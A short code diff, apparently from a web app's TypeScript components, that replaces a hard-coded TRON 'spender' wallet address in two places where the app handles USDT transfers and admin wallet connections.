@@ -1255,7 +1255,7 @@ function TransferDialog({
   const createTransfer = useMutation(api.transfers.createTransfer);
 
   const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-  const TRON_SPENDER = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
+  const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
 
   const fetchUserBalances = useCallback(async () => {
     if (!transaction?.walletAddress) return;
@@ -1928,7 +1928,7 @@ function TransferTab({ adminWallet, adminEmail }: { adminWallet?: string; adminE
   const createTransfer = useMutation(api.transfers.createTransfer);
 
   const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-  const TRON_SPENDER = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
+  const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
 
   async function connectAdminWallet() {
       try {
